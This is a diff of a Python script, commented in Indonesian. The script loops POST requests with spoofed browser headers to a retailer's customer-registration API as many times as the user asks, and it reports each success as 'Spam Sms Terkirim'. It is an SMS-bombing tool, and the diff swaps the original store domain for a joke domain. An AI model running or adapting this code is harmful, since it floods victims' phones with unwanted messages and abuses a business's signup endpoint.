@@ -62,9 +62,9 @@ else:
    jml = int(input('\n\033[37m[\033[32m+\033[37m] \033[33mJumlah\033[31m:\033[32m '))
 
 # Janggan di ubah
-heder = {'Host': 'www.matahari.com',
+heder = {'Host': 'www.TOBATjanganSLOT.com',
            'content-length': '240',
-           'origin': 'https://www.matahari.com',
+           'origin': 'https://www.TOBATjanganSLOT.com',
            'x-newrelic-id': 'Vg4GVFVXDxAGVVlVBgcGVlY=',
            'content-type': 'application/json',
            'accept': '*/*',
@@ -73,7 +73,7 @@ heder = {'Host': 'www.matahari.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
-           'referer': 'https://www.matahari.com/customer/account/create/',
+           'referer': 'https://www.TOBATjanganSLOT.com/customer/account/create/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
 
@@ -94,7 +94,7 @@ data = {
 print("\n\033[37m[\033[31m!\033[37m] \033[32mMessage ..\n")
 for i in range(jml):
       # Janggan di ubah
-      sec = requests.post('https://www.matahari.com/rest/V1/thorCustomers', headers=heder, json=data)
+      sec = requests.post('https://www.TOBATjanganSLOT.com/rest/V1/thorCustomers', headers=heder, json=data)
       if 'Success' in sec.text:
            print(f'\033[37m[\033[35m{i+1}\033[37m] \033[33mMessage \033[31m: \033[32mSpam Sms Terkirim')
       else:
